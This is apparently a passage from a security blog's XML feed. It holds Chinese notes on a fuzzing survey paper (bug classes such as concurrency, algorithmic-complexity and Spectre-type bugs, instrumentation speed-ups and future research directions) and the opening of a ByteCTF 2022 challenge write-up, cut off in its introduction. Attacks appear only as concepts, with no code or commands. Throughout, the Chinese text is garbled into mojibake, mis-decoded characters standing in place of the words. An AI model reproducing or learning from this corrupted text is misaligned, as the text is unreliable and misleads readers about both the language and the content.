KPTIï¼Œä½†åœ¨çœŸå®ä¸–ç•Œçš„é«˜æ€§èƒ½åœºæ™¯ä¸‹è¿™ä¸€ç‰¹æ€§é€šå¸¸æ˜¯è¢«å…³é—­çš„</p><blockquote><p>ï¼ˆå¬è¯´åœ¨å®é™…åº”ç”¨ä¸­æœ‰20%ä»¥ä¸Šçš„æ€§èƒ½æŸè€—ï¼Œ<s>ğŸ‘´ä¹Ÿä¸çŸ¥é“æ˜¯ä¸æ˜¯çœŸçš„</s></p></blockquote></blockquote><blockquote><p>è®ºæ–‡ç»™å‡ºäº†ä¸¤ä¸ªä¾‹å­ï¼š</p><ul><li><a href="https://www.usenix.org/conference/usenixsecurity13/technical-sessions/papers/haller">Dowser</a> ï¼šè®¤ä¸ºç¼“å†²åŒºæº¢å‡ºä¸»è¦å‘ç”Ÿäºå¾ªç¯ä¸­å¯¹æ•°ç»„çš„è®¿é—®ï¼Œé€šè¿‡æ’åºå¾ªç¯ä¸­å†…å­˜è®¿é—®æŒ‡ä»¤å¹¶ç»™æ›´é«˜æ’åºçš„è¾“å…¥é«˜ä¼˜å…ˆçº§ååˆ©ç”¨æ±¡ç‚¹åˆ†æä¸æ··åˆæ‰§è¡Œæ±‚è§£é€‰ä¸­è¾“å…¥çš„è·¯å¾„çº¦æŸä»¥æ£€æµ‹ OOB æ¼æ´</li><li><a href="https://dl.acm.org/doi/10.1145/3377811.3380386">UAFL</a>ï¼šç”±äº UAF æ¼æ´é€šå¸¸æ˜¯åˆ†é…â†’é‡Šæ”¾â†’é‡ç”¨ä¸‰æ­¥èµ°ï¼Œè¿™ä¸€æ¼æ´æ¨¡å¼é©±åŠ¨ UAFL ç”Ÿæˆèƒ½å¤Ÿé€æ¸è¦†ç›–ä¸€æ•´åˆ—æ½œåœ¨ UAF æ¼æ´çš„è¾“å…¥ï¼Œæ½œåœ¨ UAF åºåˆ—é€šè¿‡åŸºäºæ¼æ´æ¨¡å¼çš„é™æ€ç±»å‹åˆ†æå®Œæˆ</li></ul></blockquote><h3 id="5-2-2-Concurrency-Bugs">5.2.2 Concurrency Bugs</h3><p><strong>å¹¶å‘å‹æ¼æ´</strong>ï¼ˆConcurrency Bugsï¼‰åœ¨ç¨‹åºæ²¡æœ‰åˆé€‚çš„åŒæ­¥æœºåˆ¶æˆ–è¿è¡Œé¡ºåºæ—¶å‘ç”Ÿï¼Œé€šå¸¸å¯ä»¥åˆ†ä¸ºï¼š</p><ul><li><strong>æ­»é”å‹æ¼æ´</strong>ï¼ˆdeadlock bugsï¼‰ï¼šç­‰å¾…èµ„æºé‡Šæ”¾ï¼ˆå¦‚é”ï¼‰</li><li><strong>éæ­»é”å‹æ¼æ´</strong>ï¼ˆnon-deadlock bugsï¼‰<ul><li>åŸå­æ€§æŸåå‹ï¼ˆatomicity-violationï¼‰ï¼šç ´åäº†æŸä¸€ä»£ç åŒºåŸŸçš„ <em>æœŸæœ›åºåˆ—æ€§</em> ï¼ˆdesired serializabilityï¼‰ï¼Œå¦‚ Fig.8a æ‰€ç¤ºçš„ <code>Thread 1</code> ç¬¬ä¸‰è¡Œé‡Šæ”¾äº† <code>p-&gt;info</code>ï¼Œ<code>Thread 2</code> çš„ç¬¬äºŒè¡Œå°† <code>p-&gt;info</code> ç½®ä¸º NULLï¼Œä»è€Œå¼•å‘é”™è¯¯</li><li>é¡ºåºå‹ï¼ˆorderï¼‰æ¼æ´ï¼šä»¥é”™è¯¯çš„é¡ºåºå¯¹å†…å­˜åŒºåŸŸè¿›è¡Œè®¿é—®ï¼Œå¦‚ Fig.8b ä¸­ <code>Thread 2</code> åœ¨ <code>mThd</code> è¢«åˆå§‹åŒ–å‰å¯¹ <code>mState</code> èµ‹å€¼ï¼Œè¿™ä¼šé€ æˆæœªåˆå§‹åŒ–å˜é‡å¼•ç”¨æ¼æ´</li></ul></li></ul><blockquote><p><s>çœŸçš„æœ‰äººä¼šè¿™ä¹ˆå†™ä»£ç ğŸ</s></p></blockquote><p><img src="https://s2.loli.net/2022/10/30/AfHSLXUPDItFRqB.png" alt="image.png"></p><p>å‘ç°æ­»é”æ¼æ´çš„ä¸€ä¸ªæ–¹æ³•æ˜¯åœ¨ <em>é”é¡ºåºå›¾</em> ï¼ˆlock order graphï¼‰ä¸Šæ£€æµ‹ä»£è¡¨æ­»é”çš„ç¯ï¼ˆcyclesï¼‰</p><blockquote><p>è®ºæ–‡ä¸¾äº†è¿™äº›ä¾‹å­ï¼š</p><ul><li><a href="https://ieeexplore.ieee.org/document/6227156/">MagicFuzzer</a>ï¼š ä¸ºäº†æé«˜æ•ˆç‡ï¼Œå…¶ä¼šç§»é™¤ä¸åœ¨ä»»ä½•ç¯ä¸­çš„é”ï¼Œå¹¶æ£€æŸ¥å‰©ä½™çš„ç¯</li><li><a href="https://dl.acm.org/doi/abs/10.1145/1453101.1453121">ATOMFUZZER</a>ï¼šå¯¹äºåŸå­æ€§ç ´åï¼Œå…¶ä¼šè§‚æµ‹åŸå­å—å†…çš„é”è¢«ä¸¤ä¸ªçº¿ç¨‹é‡å¤è¯·æ±‚ä¸é‡Šæ”¾çš„æ¼æ´æ¨¡å¼</li><li><a href="https://dl.acm.org/doi/10.1145/1321631.1321679">CalFuzzer</a>ï¼šè¿‡å¤šçš„çº¿ç¨‹äº¤é”™ï¼ˆinterleavingï¼‰å¸¦æ¥çŠ¶æ€çˆ†ç‚¸ï¼ˆstate-explosionï¼‰ï¼Œå…¶åŸºäºäº¤é”™çš„ç­‰ä»·æ€§ç¼“è§£çŠ¶æ€çˆ†ç‚¸</li></ul></blockquote><h3 id="5-2-3-Algorithmic-Complexity">5.2.3 Algorithmic Complexity</h3><p><strong>ç®—æ³•å¤æ‚æ€§</strong>ï¼ˆAlgorithm Complexityï¼ŒACï¼‰æ¼æ´æ˜¯ç®—æ³•åœ¨æœ€åæƒ…å†µä¸‹ä¼šæ˜¾è‘—çš„é™ä½æ€§èƒ½ï¼Œä»è€Œå¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡ï¼ˆDenial-of-Serviceï¼‰æ”»å‡»ï¼ŒFig.9 å±•ç¤ºäº†ä¸€ä¸ªæœ‰ç€ä¸åŒç®—æ³•å¤æ‚åº¦çš„ä¾‹å­ï¼Œåœ¨æœ€åæƒ…å†µä¸‹å¯ä»¥è¢«æ”»å‡»è€…ç”¨ä½œ DoS  æ”»å‡»ï¼š</p><p><img src="https://s2.loli.net/2022/10/30/mYhDVBvyeSzcrix.png" alt="Fig. 9. Algorithm complexity"></p><blockquote><p>è®ºæ–‡ä¸¾äº†ä»¥ä¸‹ä¾‹å­ï¼š</p><ul><li><a href="https://dl.acm.org/doi/10.1145/3133956.3134073">SlowFuzz</a>ï¼šé€šè¿‡ç”Ÿæˆå¢åŠ æ‰§è¡ŒæŒ‡ä»¤æ•°é‡çš„è¾“å…¥æ¥å‘ç° AC æ¼æ´</li><li><a href="https://www.ndss-symposium.org/ndss-paper/hotfuzz-discovering-algorithmic-denial-of-service-vulnerabilities-through-guided-micro-fuzzing/">HotFuzz</a>ï¼šé€šè¿‡æœ€å¤§åŒ–å•ä¸ªæ–¹æ³•çš„æ¶ˆè€—æ¥æ£€æµ‹ Java ä¸­çš„ AC æ¼æ´</li><li><a href="https://ieeexplore.ieee.org/document/9284141/">MemLock</a>ï¼šé€šè¿‡è¾¹è¦†ç›–ç‡ä¸å†…å­˜æ¶ˆè€—æ¥æ£€æµ‹ AC æ¼æ´</li><li><a href="https://dl.acm.org/doi/10.1145/3236024.3236039">Singularity</a>ï¼šåŸºäº <em>æœ€åè¡¨ç°è¾“å…¥</em> ï¼ˆæˆ‘è®¤è¯†ä»– performance inputï¼ŒWPIï¼‰æ€»æ˜¯éµå¾ªæŸç§ç‰¹å®šæ¨¡å¼æ¥åˆæˆè¾“å…¥ç”Ÿæˆç¨‹åº</li></ul></blockquote><h3 id="5-2-4-Spectre-type-Bugs">5.2.4 Spectre-type Bugs</h3><p><strong>å¹½çµå‹æ¼æ´</strong>ï¼ˆSpectre-type Bugsï¼‰æ˜¯ä¸€ç§åˆ©ç”¨é”™è¯¯åˆ†æ”¯é¢„æµ‹ï¼ˆmispredicted branch speculationsï¼‰æ¥æ§åˆ¶å†…å­˜è®¿é—®çš„å¾®æ¶æ„æ”»å‡»ï¼Œä¾‹å¦‚åœ¨ Fig.10 ä¸­æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æœ‰æ•ˆå€¼æ¥è®­ç»ƒåˆ†æ”¯é¢„æµ‹ä¸ºçœŸï¼Œéšåç»™å˜é‡ä¸€ä¸ª OOB çš„å€¼ï¼Œæ­¤æ—¶é¢„æµ‹å™¨ä¾¿ä¼šé”™è¯¯é¢„æµ‹åˆ†æ”¯è¡Œä¸ºï¼Œä»è€Œé”™è¯¯åœ°æ‰§è¡Œäº†ç¬¬3ã€4è¡Œä»£ç ï¼Œé€ æˆäº†è¶Šç•Œè¯»å–</p><p><img src="https://s2.loli.net/2022/10/30/LJsx8WOUQyP2koA.png" alt="Fig. 10. Spectre-type bug"></p><blockquote><p>è®ºæ–‡ç»™å‡ºäº†è¿™ä¸ªä¾‹å­ï¼š<a href="https://www.usenix.org/conference/usenixsecurity20/presentation/oleksenko">SpecFuzz</a>ï¼Œ<s>ä¸è¿‡åœ¨ç¬”è€…çœ‹æ¥å™±å¤´å¤§äºå®é™…</s></p></blockquote><h3 id="5-2-5-Side-channels">5.2.5 Side channels</h3><p><strong>ä¾§ä¿¡é“æ¼æ´</strong>ï¼ˆside-channelï¼‰é€šè¿‡å¯¹ç³»ç»Ÿçš„éåŠŸèƒ½æ€§è¡¨ç°ï¼ˆä¾‹å¦‚æ‰§è¡Œæ—¶é—´ï¼‰æ¥æ³„éœ²ä¿¡æ¯ï¼Œä¾‹å¦‚é€šè¿‡åˆ†æ”¯æ‰§è¡Œæ—¶é—´åˆ¤æ–­æ‰§è¡Œçš„åˆ†æ”¯</p><blockquote><p>è®ºæ–‡æ²¡ç»™ä¾‹å­ï¼Œé‚£ç¬”è€…ç»™å‡ºä¸€ä¸ªä¾‹å­ï¼š<a href="https://gruss.cc/files/prefetch.pdf">prefetch side-channel attack: bypassing SMAP and KASLR</a></p></blockquote><p><strong>JIT-induced side channels</strong>ï¼ˆ<s>ä¸æ‡‚å’‹ç¿»</s>ï¼‰æ˜¯ä¸€ç§ç”±å³æ—¶ä¼˜åŒ–ï¼ˆJust-In-Time Optimizationï¼‰å¯¼è‡´çš„ç‰¹æ®Šä¾§ä¿¡é“ï¼Œç±»ä¼¼äºå¹½çµå‹æ¼æ´ï¼Œé€šè¿‡è®­ç»ƒ JIT ç¼–è¯‘å™¨ä¼˜åŒ–å•ä¸€åˆ†æ”¯ä»¥ä½¿å¾—ä¸¤æ‰§è¡Œåˆ†æ”¯é—´æ‰§è¡Œæ—¶é—´å·®å¤§åˆ°å¯ä»¥è¢«è§‚æµ‹åˆ°</p><h3 id="5-2-6-Integer-Bugs">5.2.6 Integer Bugs</h3><p><strong>æ•´å‹ä¸Šæº¢/ä¸‹æº¢</strong>ï¼ˆInteger Overflow/Underflowï¼‰åœ¨ç®—æœ¯è¡¨è¾¾å¼çš„å€¼è¶…è¿‡æœºå™¨ç±»å‹æ‰€å†³å®šçš„èŒƒå›´æ—¶å‘ç”Ÿï¼Œæˆ–æ˜¯åœ¨æ•´å‹é—´è½¬æ¢æ—¶å‘ç”Ÿï¼ˆæ¯”å¦‚ int to uintï¼‰</p><blockquote><p>è®ºæ–‡ä¸¾äº†è¿™ä¸ªä¾‹å­ï¼š<a href="https://dl.acm.org/doi/10.5555/1855768.1855773">SmartFuzz</a></p></blockquote><h2 id="5-3-Improvement-of-Execution-Speed">5.3 Improvement of Execution Speed</h2><p>æ‰§è¡Œé€Ÿåº¦å¯¹æ¨¡ç³Šæµ‹è¯•è€Œè¨€éå¸¸å…³é”®ï¼Œæ›´é«˜çš„æ‰§è¡Œé€Ÿåº¦æ„å‘³ç€åœ¨åŒä¸€æ—¶é—´èƒ½è·‘æ›´å¤šæµ‹è¯•ç”¨ä¾‹ï¼Œä»è€Œæé«˜å‘ç°ç¼ºé™·çš„æœºä¼š</p><h3 id="5-3-1-Binary-Analysis">5.3.1 Binary Analysis</h3><p><strong>é™æ€æ’æ¡©</strong>ï¼ˆstatic instrumentationï¼‰æ˜¯ä¸»æµçš„è·å–æ‰§è¡ŒçŠ¶æ€çš„æ–¹å¼ï¼Œå› ä¸ºå…¶ä¸º fuzzing æä¾›äº†æ›´é«˜çš„æ‰§è¡Œé€Ÿåº¦</p><ul><li><p>å¯¹å¼€æºç¨‹åºè€Œè¨€ï¼Œä¸€ä¸ªè¢«å¹¿æ³›ä½¿ç”¨çš„é™æ€åˆ†æå·¥å…·æ˜¯ <code>LLVM</code>ï¼Œå…¶åœ¨ç¼–è¯‘æœŸè¿›è¡Œæ’æ¡©</p></li><li><p>å¯¹äºé—­æºç¨‹åºè€Œè¨€ï¼Œfuzzer è¢«é™åˆ¶äºäºŒè¿›åˆ¶åˆ†æï¼Œä½†äºŒè¿›åˆ¶æ’æ¡©å·¥å…·æœ‰ç€ä¸è²çš„è¿è¡Œæ—¶å¼€é”€</p><blockquote><p>è®ºæ–‡ç»™å‡ºäº†è¿™äº›ä¾‹å­ï¼š</p><ul><li><a href="https://ieeexplore.ieee.org/document/9152762">RetroWrite</a> ä½¿ç”¨åŸºäºå¯é‡æ±‡ç¼–çš„æ±‡ç¼–ï¼ˆreassembleable assemblyï¼‰çš„é™æ€äºŒè¿›åˆ¶é‡å†™æŠ€æœ¯ï¼Œå…¶å…³æ³¨äºä½¿ç”¨ 64 ä½çš„ <em>åœ°å€æ— å…³ä»£ç </em> ï¼ˆposition independent codeï¼ŒPICï¼‰çš„é‡å®šä½ä¿¡æ¯æ¥æ’æ¡©æ±‡ç¼–ç¨‹åº</li><li><a href="https://www.usenix.org/conference/usenixsecurity21/presentation/nagy">FIBRE</a> é€šè¿‡å››ä¸ªä¿®æ”¹ä¸­é—´è¡¨ç¤ºçš„é˜¶æ®µï¼ˆIR-modifying phaseï¼‰æ¥æµæ°´çº¿åŒ–æ’æ¡©</li><li><a href="https://ieeexplore.ieee.org/document/9519407">STOCHFUZZ</a> é€šè¿‡å¤šæ¬¡é‡å†™æ¥è§£å†³æ­¤å‰é‡å†™çš„é—ç•™é—®é¢˜</li></ul></blockquote></li></ul><h3 id="5-3-2-Execution-Process">5.3.2 Execution Process</h3><p>æ‰§è¡Œé€Ÿåº¦åŒæ ·å¯ä»¥åœ¨æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ä¸­æå‡ï¼Œä¾‹å¦‚ <a href="https://ieeexplore.ieee.org/document/8835316">UnTracer</a> è§‚æµ‹åˆ°å¤§éƒ¨åˆ†æµ‹è¯•ç”¨ä¾‹å¹¶ä¸ä¼šå¸¦æ¥æ–°çš„è¦†ç›–ç‡ï¼Œç”±æ­¤å…¶ä»…è¿½è¸ªä¼šå¢åŠ è¦†ç›–ç‡çš„æµ‹è¯•ç”¨ä¾‹</p><blockquote><p>è®ºæ–‡è¿˜ç»™å‡ºè¿™äº›ä¾‹å­ï¼š</p><ul><li><a href="https://ieeexplore.ieee.org/document/9139349/">CSI-Fuzz</a> ä½¿ç”¨è¾¹è¦†ç›–ç‡æ¥æ”¹è¿› UnTracerï¼Œå› ä¸ºå—è¦†ç›–ç‡ä¸§å¤±äº†æ‰§è¡ŒçŠ¶æ€ä¿¡æ¯</li><li><a href="https://ieeexplore.ieee.org/document/9286017">Zeror</a> é€šè¿‡åœ¨ UnTracer  æ’æ¡©ä¸ AFL æ’æ¡©é—´åˆ‡æ¢æ¥æ”¹è¿› UnTracer</li></ul></blockquote><p>å¯¹äºæ··åˆæ¨¡ç³Šæµ‹è¯•ï¼Œæ··åˆæ‰§è¡Œè¢«ç”¨ä»¥æ±‚è§£è·¯å¾„çº¦æŸï¼Œä½†ç¬¦å·æ‰§è¡Œåœ¨è¡¨ç¤ºè·¯å¾„çº¦æŸä¸Šè¾ƒæ…¢ï¼Œ<a href="">QSYM</a> é€šè¿‡ç§»é™¤ä¸€äº›è€—æ—¶çš„å†…å®¹ï¼ˆIR ç¿»è¯‘ã€å¿«ç…§ç­‰ï¼‰æ¥ç¼“è§£æ€§èƒ½ç“¶é¢ˆ</p><blockquote><p>è®ºæ–‡è¿˜ç»™å‡ºè¿™äº›ä¾‹å­ï¼š</p><ul><li><a href="https://dl.acm.org/doi/10.1145/3319535.3354249">Intriguer</a> è§‚æµ‹åˆ° QSYM ä»æ±‚è§£ä¸å¿…è¦çº¦æŸå¯¼è‡´çš„æ€§èƒ½è¯„ä»·ï¼Œå› æ­¤å…¶ä½¿ç”¨ç¬¦å·æ‰§è¡Œç”±åŠ¨æ€æ±¡ç‚¹åˆ†æç¡®è®¤çš„æ›´ç›¸å…³æŒ‡ä»¤</li><li><a href="https://dl.acm.org/doi/10.1145/3133956.3134046">Xu</a> å‘ç° AFL åœ¨å¹¶è¡Œè·‘ 120 æ ¸æ—¶æ˜¾è‘—å˜æ…¢ï¼Œæ•…å…¶è®¾è®¡äº†æ–°çš„æ“ä½œåŸè¯­ï¼ˆoperating primitivesï¼‰æ¥æå‡æ‰§è¡Œé€Ÿåº¦</li></ul></blockquote><h3 id="5-3-3-Various-Applications">5.3.3 Various Applications</h3><p>æ¨¡ç³Šæµ‹è¯•è¢«ç”¨ä»¥æ£€æµ‹å¤šç§ç›®æ ‡ä¸­çš„ç¼ºé™·ï¼Œå¦‚ IoTã€OS kernelã€VMM ç­‰ï¼Œéœ€è¦æ ¹æ®ç›®æ ‡ç‰¹æ€§è¿›è¡Œå®¢åˆ¶åŒ–</p><blockquote><p>è®ºæ–‡ç»™å‡ºè¿™äº›ä¾‹å­ï¼š</p><ul><li><a href="https://www.usenix.org/conference/usenixsecurity19/presentation/zheng">FIRM-AFL</a> é€šè¿‡ç»“åˆç”¨æˆ·æ€æ¨¡æ‹Ÿä¸å…¨ç³»ç»Ÿæ¨¡æ‹Ÿæ¥ç¼“è§£ä¼ ç»Ÿ IOT å›ºä»¶ fuzzing ä¸­å…¨ç³»ç»Ÿæ¨¡æ‹Ÿå¸¦æ¥çš„è™šæ‹Ÿåœ°å€ä¸å†…å­˜è®¿é—®é—´ç¿»è¯‘åŠæ¨¡æ‹Ÿç³»ç»Ÿè°ƒç”¨çš„å¼€é”€</li><li>Schumilo è®¾è®¡äº†ä¸€ç§<a href="https://www.ndss-symposium.org/ndss-paper/hyper-cube-high-dimensional-hypervisor-fuzzing/">å®¢åˆ¶åŒ– OS</a> ä¸<a href="https://www.usenix.org/conference/usenixsecurity21/presentation/schumilo">å¿«é€Ÿå¿«ç…§å­˜å‚¨æœºåˆ¶</a></li><li>ã€‚ã€‚ã€‚</li></ul></blockquote><blockquote><p><strong>Gap 3</strong>ï¼šå¯¹åº”ç”¨çš„è‡ªåŠ¨åŒ–æ‰§è¡ŒåŸºäºå¯¹å…¶çš„æ·±å…¥ç†è§£ï¼Œåœ¨è®¾è®¡è‡ªåŠ¨è®°å½•å®‰å…¨ç¼ºé™·çš„ indicators æ—¶éœ€è¦é¦–å…ˆç ”ç©¶è¿™äº›ç¼ºé™·çš„ç‰¹æ€§</p></blockquote><h1>0x06. DIRECTIONS OF FUTURE RESEARCH</h1><p>æœ¬èŠ‚æ€»ç»“äº† fuzzing æœªæ¥çš„ç ”ç©¶æ–¹å‘</p><ul><li><strong>More sensitive fitness</strong>ï¼šç ”ç©¶äººå‘˜æ„è¯†åˆ°ä»£ç è¦†ç›–åœ¨å‘ç°å¤æ‚æ¼æ´ä¸Šå­˜åœ¨å±€é™æ€§ï¼Œå› æ­¤å…¶é€šè¿‡å¼•å…¥ç”±åˆ†ææ¼æ´è·å¾—çš„ä¿¡æ¯æ¥æ”¹è¿›ä»£ç è¦†ç›–ã€‚æœªæ¥çš„å·¥ä½œå¯ä»¥æ˜¯åŸºäºæ¼æ´ç‰¹æ€§åˆ†æä¸æ£€æµ‹æ¼æ´ï¼Œå°¤å…¶æ˜¯åˆ†æé‚£äº› fuzzing æœªåˆ†æå‡ºçš„æ¼æ´</li><li><strong>More sophisticated fuzzing theory</strong>ï¼šç»å¤§éƒ¨åˆ†ç°æœ‰çš„å·¥ä½œéƒ½è‡´åŠ›äºç§å­è°ƒåº¦ä¸Šï¼Œä»…å°‘éƒ¨åˆ†å·¥ä½œå…³æ³¨äº fuzzing çš„å…¶ä»–è¿‡ç¨‹ã€‚å¯¹æ•´ä¸ªæ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹è¿›è¡Œæ•°å­¦åŒ–æ„å»ºå¹¶éå°äº‹ï¼Œä½†æ„å»ºå¤šä½™ä¸€ä¸ªæ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹æ˜¯å¯èƒ½çš„ï¼Œä¾‹å¦‚ Game Theory ä¾¿åŒæ—¶è€ƒè™‘äº†ç§å­è°ƒåº¦ä¸å­—èŠ‚è°ƒåº¦ã€‚ä¸€ä¸ªæ›´å¤§çš„å›¾æ™¯æ˜¯å…³äºæ¨¡ç³Šæµ‹è¯•çš„ç†è®ºå±€é™ï¼ˆä¾‹å¦‚ç°ç›’æ¨¡ç³Šæµ‹è¯•çš„å±€é™ï¼‰ã€‚å¦ä¸€æ–¹é¢ï¼Œä½¿ç”¨å¤šç§ç±»å‹çš„ fitness æ„å»º fuzzing è¿‡ç¨‹æ˜¯å¦ä¸€ç§åˆ›å»ºæ›´å…ˆè¿› fuzzing ç†è®ºçš„æ–¹å¼ï¼Œä¾‹å¦‚æœªæ¥çš„å·¥ä½œå¯èƒ½æ„å»ºåŒæ—¶è€ƒè™‘æ¼æ´å‡ºç°ä¸çŠ¶æ€è½¬ç§»çš„ fuzzing è¿‡ç¨‹</li><li><strong>Sound evaluation</strong>ï¼šä¸€éƒ¨åˆ†å·¥ä½œå…³æ³¨äºè¯„ä¼°çš„å¯é æ€§ï¼ˆsoundness of evaluationï¼‰ï¼Œä½†æ²¡æœ‰æ˜ç¡®ç»“è®ºï¼ˆÂ§3.6ï¼‰ï¼Œæœ‰æ›´å¤šçš„é—®é¢˜å¾…æˆ‘ä»¬è§£ç­”ï¼šåœ¨è¯„ä¼°è¯­æ–™åº“ä¸­è¯¥ä½¿ç”¨çœŸå®æ¼æ´è¿˜æ˜¯åˆæˆæ¼æ´ï¼Ÿé™æ€æµ‹è¯•æ˜¯åŒºåˆ†ä¸åŒ fuzzing æŠ€æœ¯çš„æœ€ç»ˆç­”æ¡ˆğŸï¼Ÿåˆç†çš„ time budget åº”å½“æ˜¯ï¼Ÿå¦‚ä½•åœ¨æ²¡æœ‰å…¶ä»–å¯æ¯”è¾ƒ fuzzer çš„æƒ…å†µä¸‹è¯„ä¼°ç‰¹æ®Šç›®æ ‡ï¼ˆå¦‚ç¡¬ä»¶ï¼‰ï¼Ÿ</li><li><strong>Scalable input inference</strong>ï¼šè‹¥åœ¨ fuzzing ä¸­èƒ½ä½¿ç”¨æ ¼å¼æˆ–æ•°æ®ä¾èµ–é¡¹åˆ™èƒ½æ˜¾è‘—æé«˜ fuzzing æ•ˆç‡ï¼ˆÂ§4.6&amp;Â§4.7ï¼‰ï¼Œé™æ€åˆ†æè¢«å¹¿æ³›ç”¨äºæ ¼å¼ä¸æ•°æ®ä¾èµ–é¡¹æ¨æ–­ï¼Œä½†å…¶ç‰¹å®šäºç‰¹å®šç¨‹åºï¼Œè€Œæ¨æ–­æ–¹æ¡ˆçš„å®ç°éœ€è¦è€ƒè™‘ä¸åŒåº”ç”¨çš„ç‰¹æ€§ã€‚åŠ¨æ€åˆ†æå…³æ³¨äºæ ¼å¼æ¨æ–­ï¼Œä»…å°‘éƒ¨åˆ†åœ¨æ•°æ®ä¾èµ–é¡¹æ¨æ–­ä¸Šåšäº†å·¥ä½œï¼Œè€Œå…¶æ¯”é™æ€åˆ†ææ›´å¯æ‰©å±•ï¼ˆscalableï¼‰</li><li><strong>Efficient mutation operators</strong>ï¼šå‡ ä¹æ‰€æœ‰ fuzzer éƒ½åœ¨ fuzzing ä¸­ä½¿ç”¨æ··åˆçš„å˜å¼‚å™¨ï¼Œä½†åœ¨ fuzzing ä¸­å¹¶ä¸ä¼šä¿®æ”¹å˜å¼‚å™¨ï¼ˆÂ§4ï¼‰ï¼Œä¸€éƒ¨åˆ†å·¥ä½œåœ¨ä¼˜åŒ–å˜å¼‚å™¨è°ƒåº¦ä¸Šï¼Œä½†æ²¡äººå…³æ³¨äºå¯å˜çš„å˜å¼‚å™¨ï¼ˆÂ§3.4ï¼‰ã€‚ç”±äºå˜å¼‚å™¨è°ƒåº¦ä¸å­—èŠ‚è°ƒåº¦ç´§å¯†å…³è”ï¼Œå¯ä»¥è€ƒè™‘åŸºäºå­—èŠ‚è°ƒåº¦è®¾è®¡å˜å¼‚å™¨ã€‚å¯¹é«˜åº¦ç»“æ„åŒ–è¾“å…¥çš„å˜å¼‚å™¨è°ƒåº¦ä¹Ÿå€¼å¾—ç ”ç©¶</li><li><strong>More types of applications</strong>ï¼šç”±äºåº”ç”¨çš„å¤æ‚æ€§ï¼Œfuzzing åœ¨æ£€æµ‹æ›´å¤šç±»å‹åº”ç”¨ä¸Šæœ‰å…¶å±€é™ï¼Œä¾‹å¦‚ä¸€éƒ¨åˆ†å·¥ä½œæ¢ç´¢äº† fuzz CPSs çš„å¯èƒ½æ€§ï¼Œä½†èƒ½åŠ›é­åˆ°äº†é™åˆ¶ã€‚ç”±äºæ‰§è¡Œé€Ÿåº¦å¯¹ fuzzing è€Œè¨€å¾ˆé‡è¦ï¼Œå› æ­¤å¯¹äºéš¾ä»¥è¢« fuzz çš„ç¨‹åºè€Œè¨€ï¼Œä¸€ä¸ªæ½œåœ¨çš„æ–¹å‘æ˜¯æå‡ä»–ä»¬çš„æ‰§è¡Œé€Ÿåº¦</li><li><strong>More types of bugs</strong>ï¼šfuzzing åœ¨æ£€æµ‹å¦‚å†…å­˜ç ´åã€å¹¶å‘æ¼æ´ã€ç®—æ³•å¤æ‚æ€§æ¼æ´ä¸Šå–å¾—è‰¯å¥½æˆæœï¼ˆÂ§5.2ï¼‰ï¼Œä½†åœ¨æ£€æµ‹å…¶ä»–ç±»å‹æ¼æ´ï¼ˆå¦‚æƒé™æå‡æˆ–é€»è¾‘æ¼æ´ï¼‰ä¸Šä»å­˜åœ¨å›°éš¾ï¼Œéš¾ç‚¹åœ¨äºå¦‚ä½•è®¾è®¡åˆé€‚çš„ indicatorï¼Œè¿™éœ€è¦ç ”ç©¶äººå‘˜åŒæ—¶å¯¹ fuzzing ä¸ç›®æ ‡æ¼æ´æœ‰ç€æ·±åˆ»ç†è§£</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ¨¡ç³Šæµ‹è¯•ä¸ºä»€ä¹ˆæ˜¯ç¥&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="http://blog.arttnba3.cn/categories/PAPER/"/>
    
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="FUZZ" scheme="http://blog.arttnba3.cn/tags/FUZZ/"/>
    
    <category term="è®ºæ–‡ç¬”è®°" scheme="http://blog.arttnba3.cn/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>ã€CTF.0x07ã€‘ByteCTF2022 byte_run å‡ºé¢˜æ‰‹è®°</title>
    <link href="http://blog.arttnba3.cn/2022/09/30/CTF-0X07-BYTECTF2022_BYTERUN/"/>
    <id>http://blog.arttnba3.cn/2022/09/30/CTF-0X07-BYTECTF2022_BYTERUN/</id>
    <published>2022-09-30T15:48:01.000Z</published>
    <updated>2022-11-23T18:45:06.334Z</updated>
    
    <content type="html"><![CDATA[<p>å‰å¹´ğŸ‘´å½“é€‰æ‰‹çš„æ—¶å€™è¿˜æœ‰â‘¤â­çº§çš„å¸¦ğŸ¨ä½ï¼Œä»Šå¹´å½“å‡ºé¢˜äººğŸ‘´åªèƒ½å–è¥¿åŒ—é£</p><span id="more"></span><h1>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>ä½œä¸ºä¸€åå®‰å…¨ç ”ç©¶å‘˜ï¼Œç¬”è€…ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿›äº†å­—èŠ‚è·³åŠ¨å½“å¼€å‘ï¼Œäºæ˜¯å°±ä¸çŸ¥é“ä¸ºä»€ä¹ˆåˆè·‘å»å¸® ByteCTF å‡ºé¢˜äº†ï¼ˆç¬‘ï¼‰</p><p>å…¶å®è¿™é“é¢˜æœ€åˆçš„çµæ„Ÿæ¥è‡ªäº Google CTF 2021 çš„ä¸€é“åä¸º â€œfullchainâ€ çš„é¢˜ç›®ï¼Œé‚£æ˜¯ä¸€é“ chrome v8 + mojo sandbox escape + kernel primitive çš„é¢˜ç›®ï¼Œ<strong>ä¸€æ¡éå¸¸å®Œæ•´çš„åˆ©ç”¨é“¾ï¼Œç¬”è€…è§‰å¾—éå¸¸å¸…æ°”</strong>ï¼ˆç¬‘ï¼‰</p><p>ç¬”è€…ä¹Ÿä¸€ç›´æƒ³å‡ºä¸€é“æ¯”è¾ƒã€Œå®Œæ•´ã€ï¼ˆfull chainï¼‰çš„é¢˜ç›®ï¼Œä¸è¿‡é™äºè‡ªèº«æŠ€æœ¯æ°´å¹³è¾ƒä½çš„ç¼˜æ•…å†åŠ 